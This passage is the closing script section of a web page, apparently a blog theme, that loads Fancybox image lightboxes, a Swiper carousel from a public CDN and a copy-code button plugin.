      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
